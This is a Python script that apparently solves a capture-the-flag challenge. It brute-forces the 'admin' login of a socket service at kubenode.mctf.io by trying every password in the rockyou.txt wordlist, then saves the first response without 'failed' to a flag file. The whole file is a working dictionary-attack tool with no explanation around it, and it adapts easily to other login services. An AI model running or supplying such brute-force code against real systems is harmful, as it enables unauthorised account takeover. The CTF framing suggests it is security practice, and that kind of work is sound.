#don't remember this one

import socket
import time

def try_login(s, password):
    # Send the password
    s.sendall((password + '\n').encode())

    # Receive the response
    response = s.recv(4096).decode()
    print(f"Received response after sending password: {response}")

    # Check if the word "failed" is not in the response (successful login)
    if 'failed' not in response:
        # If no "failed", it means we found the correct password
        print(f"Login successful with password: {password}")
        print(f"Response: {response}")
        with open('flag_response.txt', 'w') as f:
            f.write(response)
        return True

    return False


# Create a new socket connection (keep the connection open for all attempts)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('kubenode.mctf.io', 30020))

# Receive initial data (greeting or menu)
response = s.recv(4096).decode()
print(f"Initial response: {response}")

# Send '2' to select login
s.sendall(b'2\n')
response = s.recv(4096).decode()
print(f"Response after sending '2': {response}")

# Send 'admin' as the username
s.sendall(b'admin\n')
response = s.recv(4096).decode()
print(f"Response after sending 'admin': {response}")

# Open the rockyou.txt wordlist (use the local one if needed)
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as wordlist:
    for line in wordlist:
        password = line.strip()

        # Print the password we're testing
        print(f"Testing password: {password}")

        # Send '2' again to select login in case the connection was reset
        s.sendall(b'2\n')
        response = s.recv(4096).decode()
        print(f"Response after sending '2' again: {response}")

        # Send 'admin' as the username each time
        s.sendall(b'admin\n')
        response = s.recv(4096).decode()
        print(f"Response after sending 'admin' again: {response}")

        # Try the password
        if try_login(s, password):
            break

        # Allow a brief pause between attempts
        time.sleep(1)

# Close the connection after finishing the loop
s.close()
